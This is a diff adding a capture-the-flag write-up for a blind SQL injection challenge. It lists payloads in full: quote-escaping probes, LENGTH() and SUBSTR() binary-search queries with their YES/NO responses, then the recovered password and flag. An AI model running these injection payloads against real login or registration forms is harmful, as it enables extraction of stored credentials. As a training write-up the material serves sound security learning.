@@ -561,6 +561,76 @@ FLAG: 1430758
 
 (See client.py for the code)
 -------------------------------
+Injection 4 - 150 
+
+Oh goody, another SQL injection challenge!
+This time, they lay it on pretty thick that you'll have to use the 'new feature'.
+
+Looking at the registration php source, we see that the input isn't sanitised, meaning we can escape the query easily. Further down, we can see that there are 2 possible responses: "Already registered" (YES) or "Registration is disabled" (NO). This is clearly a case of Blind SQLi. With each request, we can get 1 bit of information (true or false).
+
+First, can we get a positive and a negative response?
+admin 											YES
+admin2											NO
+
+Good, now can we escape the query?
+admin' AND '0'='0 								YES
+admin' AND '0'='1 								NO
+Just remember that there is a trailing quotation mark that we need to take care of. By adding "OR 0='1" at the end, we take care of that without changing the outcome of the query.
+
+Alright, we know that it's a MySQL DB from the source, so can we use the LENGTH function?
+admin' AND LENGTH(password)>0 OR 0='1 			YES
+admin' AND OR 0='1								NO
+
+Let's find the length of the password:
+admin' AND LENGTH(password)>5 OR 0='1 			YES
+admin' AND LENGTH(password)>10 OR 0='1 			YES
+admin' AND LENGTH(password)>20 OR 0='1 			YES
+admin' AND LENGTH(password)>30 OR 0='1 			NO
+admin' AND LENGTH(password)>25 OR 0='1 			YES
+admin' AND LENGTH(password)=26 OR 0='1 			NO
+admin' AND LENGTH(password)=27 OR 0='1 			YES
+
+It appears there are 27 characters in the password.
+We could now start it asking if the first letter is 'a', 'b', etc. But that would take an average of 13 questions per character, which is a lot of testing. This is why using a binary search is faster:
+admin' AND SUBSTR(password,1,1)>'m' OR 0='1 	YES
+admin' AND SUBSTR(password,1,1)>'t' OR 0='1 	YES
+admin' AND SUBSTR(password,1,1)>'w' OR 0='1 	YES
+admin' AND SUBSTR(password,1,1)>'y' OR 0='1 	NO
+admin' AND SUBSTR(password,1,1)='x' OR 0='1 	NO
+admin' AND SUBSTR(password,1,1)='y' OR 0='1 	YES
+
+The first letter is 'y'. We can continue this way until we have the complete password. Obviously, there are tools to do this kind of thing automatically, but this isn't needed here, because a lot of the letters are guessable based on the previous one(s). 
+admin' AND SUBSTR(password,1,1)='y' OR 0='1 	YES
+admin' AND SUBSTR(password,2,1)='o' OR 0='1 	YES
+admin' AND SUBSTR(password,3,1)='u' OR 0='1 	YES
+admin' AND SUBSTR(password,4,1)='l' OR 0='1 	YES
+admin' AND SUBSTR(password,5,1)='l' OR 0='1 	YES
+admin' AND SUBSTR(password,6,1)='n' OR 0='1 	YES
+admin' AND SUBSTR(password,7,1)='e' OR 0='1 	YES
+admin' AND SUBSTR(password,8,1)='v' OR 0='1 	YES
+admin' AND SUBSTR(password,9,1)='e' OR 0='1 	YES
+admin' AND SUBSTR(password,10,1)='r' OR 0='1 	YES
+admin' AND SUBSTR(password,11,1)='g' OR 0='1 	YES
+admin' AND SUBSTR(password,12,1)='u' OR 0='1 	YES
+admin' AND SUBSTR(password,13,1)='e' OR 0='1 	YES
+admin' AND SUBSTR(password,14,1)='s' OR 0='1 	YES
+admin' AND SUBSTR(password,15,1)='s' OR 0='1 	YES
+admin' AND SUBSTR(password,16,1)='t' OR 0='1 	YES
+admin' AND SUBSTR(password,17,1)='h' OR 0='1 	YES
+admin' AND SUBSTR(password,18,1)='i' OR 0='1 	YES
+admin' AND SUBSTR(password,19,1)='s' OR 0='1 	YES
+admin' AND SUBSTR(password,20,1)='p' OR 0='1 	YES
+admin' AND SUBSTR(password,21,1)='a' OR 0='1 	YES
+admin' AND SUBSTR(password,22,1)='s' OR 0='1 	YES
+admin' AND SUBSTR(password,23,1)='s' OR 0='1 	YES
+admin' AND SUBSTR(password,24,1)='w' OR 0='1 	YES
+admin' AND SUBSTR(password,25,1)='o' OR 0='1 	YES
+admin' AND SUBSTR(password,26,1)='r' OR 0='1 	YES
+admin' AND SUBSTR(password,27,1)='d' OR 0='1 	YES
+
+password: youllneverguessthispassword
+
+Funny thing is that already guessed it after 4 characters. Just use this password to log in and you get the flag: whereof_one_cannot_speak_thereof_one_must_be_silent
 -------------------------------
 -------------------------------
 -------------------------------
